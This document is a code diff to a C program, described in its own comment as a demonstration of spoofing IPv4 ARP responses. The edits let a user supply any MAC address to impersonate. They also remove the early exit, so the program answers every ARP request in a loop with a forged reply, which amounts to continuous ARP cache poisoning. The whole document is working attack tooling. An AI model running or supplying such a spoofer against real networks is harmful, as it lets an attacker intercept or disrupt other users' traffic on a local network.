@@ -3,8 +3,7 @@
  *
  *  Demonstrates how to spoof an IPv4 ARP response
  *
- *  Usage: spoofer device address
- *         e.g. spoofer eth0  192.168.0.119
+ *  <https://blog.fpmurphy.com/2007/11/spoof-an-ipv4-arp-response.html>
  */
 
 #include <stdio.h>
@@ -12,6 +11,7 @@
 #include <string.h>
 #include <errno.h>
 #include <libgen.h>
+#include <unistd.h>
 
 #include <sys/ioctl.h>
 #include <sys/socket.h>
@@ -42,7 +42,7 @@ struct arphdr
 
 
 char *
-ipaddr_string(char *ina)
+ipaddr_string(unsigned char *ina)
 {
     static char buf[IP_DOTLEN + 1];
     unsigned char *p = ina;
@@ -56,7 +56,7 @@ ipaddr_string(char *ina)
 void
 usage(char *prog)
 {
-    printf("Usage: %s interfacename ipaddress (e.g. eth0 192.168.0.119)\n", basename(prog));
+    printf("Usage: %s <interface> <ip> <mac>\n", basename(prog));
 }
 
 int
@@ -75,7 +75,12 @@ main(int argc,
     char smac[ETH_ALEN];
     int sd, n;
 
-    if (argc < 3) {
+    if (argc != 4) {
+        usage(argv[0]);
+        exit(1);
+    }
+
+    if (6 != sscanf(argv[3], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &smac[0], &smac[1], &smac[2], &smac[3], &smac[4], &smac[5])) {
         usage(argv[0]);
         exit(1);
     }
@@ -94,7 +99,7 @@ main(int argc,
     }
 
     // get device interface
-    strcpy(iface.ifr_name, argv[1]);
+    strncpy(iface.ifr_name, argv[1], IFNAMSIZ - 1);
     if ((ioctl(sd, SIOCGIFHWADDR, &iface)) < 0)
     {
         perror("ioctl");
@@ -102,21 +107,10 @@ main(int argc,
         exit(3);
     }
 
-    // fake MAC address is just last 8 bits of real MAC incremented by 1
-    iface.ifr_hwaddr.sa_data[5]++;
-
-    memcpy(smac, &(iface.ifr_hwaddr.sa_data), ETH_ALEN);
-
     printf("Fake MAC address is %02x:%02x:%02x:%02x:%02x:%02x\n",
-#if DEBUG
-        (unsigned char)iface.ifr_hwaddr.sa_data[0], (unsigned char)iface.ifr_hwaddr.sa_data[1],
-        (unsigned char)iface.ifr_hwaddr.sa_data[2], (unsigned char)iface.ifr_hwaddr.sa_data[3],
-        (unsigned char)iface.ifr_hwaddr.sa_data[4], (unsigned char)iface.ifr_hwaddr.sa_data[5]);
-#else
         (unsigned char)smac[0], (unsigned char)smac[1],
         (unsigned char)smac[2], (unsigned char)smac[3],
         (unsigned char)smac[4], (unsigned char)smac[5]);
-#endif
 
     // process packets
     while (1) {
@@ -142,7 +136,7 @@ main(int argc,
             spoof_arp->ha_len = ETH_ALEN;                                       // Hardware address length
             spoof_arp->pa_len = IP_ALEN;                                        // Protocol address length
             spoof_arp->opcode = htons(ARPOP_REPLY);                             // ARP operation type
-            memcpy(spoof_arp->src_addr, iface.ifr_hwaddr.sa_data, ETH_ALEN);    // Sender MAC
+            memcpy(spoof_arp->src_addr, smac, ETH_ALEN);                        // Sender MAC
             memcpy(spoof_arp->src_ip, arp->dst_ip, IP_ALEN);                    // Source IP
             memcpy(spoof_arp->dst_add, arp->src_addr, ETH_ALEN);                // Target MAC
             memcpy(spoof_arp->dst_ip, arp->src_ip, IP_ALEN);                    // Target IP
@@ -160,8 +154,6 @@ main(int argc,
                close(sd);
                exit(5);
            }
-
-           break;
        }
    }
 
